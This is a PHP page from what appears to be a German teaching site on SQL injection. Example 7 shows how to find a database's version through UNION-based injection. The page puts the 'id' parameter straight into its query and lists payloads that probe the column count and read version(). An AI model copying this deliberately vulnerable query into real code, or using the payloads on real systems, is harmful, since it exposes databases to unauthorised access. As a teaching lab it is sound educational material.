<?php
	$id = $_GET['id'];

	$host = 'localhost'; //Host: localhost
	$datenbankname = 'xxxx'; //Datenbankname
	$tablename = 'xxxx'; //Tabellenname
	$dbUsername = 'xxxx'; //Benutzername
	$dbPassword = 'xxxx'; //Password

	echo '
		<!DOCTYPE html>
		<html>
			<head>
				<meta charset="UTF-8">
				<title>Beispiel 7</title>
			</head>

			<body>
				<a href="http://sqlinjectionwwi.bplaced.net/">Zurück</a><br><br>
				<h1>Beispiel 7</h1>
				<p>SQL Version des Servers herausfinden</p>
				<br>Zuerst die vorherige Query mit <code>+and+1=2</code> unwahr machen<br><br>
				Aus dem vorherigen Beispiel wissen wir, wie man die Spaltenanzahl mit UNION herausfindet und eigene SELECT anfragen senden kann:<br><br>
				<code>+and+1=2+union+select+1+--+</code> => Fehler => 1 Spalte ?<br>
				<code>+and+1=2+union+select+1,2+--+</code> => Fehler => 2 Spalten ?<br>
				<code>+and+1=2+union+select+1,2,3+--+</code> => Fehler => 3 Spalten ?<br>
				<code>+and+1=2+union+select+1,2,3,4+--+</code> => Kein Fehler => 4 Spalten!<br>
				<br><br>
				Mit <code>+and+1=2+union+select+1,2,version(),4+--+</code> können wir uns nun die SQL Version als Produktbeschreibung ausgeben lassen.
				<br><br>Ausgabe:<br>';

	//Neue Verbindung öffnen
	$handler = new PDO("mysql:host=$host;dbname=$datenbankname", $dbUsername, $dbPassword);

	$lQuery = "SELECT id, preis, beschreibung, anzahl FROM $tablename WHERE id = $id";

	foreach ($handler->query($lQuery) as $lRow)
	{
		$lPreis = $lRow['preis'];
		$lBeschreibung = utf8_encode($lRow['beschreibung']);
		
		echo "Produktpreis: $lPreis Euro<br>Produktbeschreibung: $lBeschreibung";
	}

	echo '
		</body></html> 
	';
?>

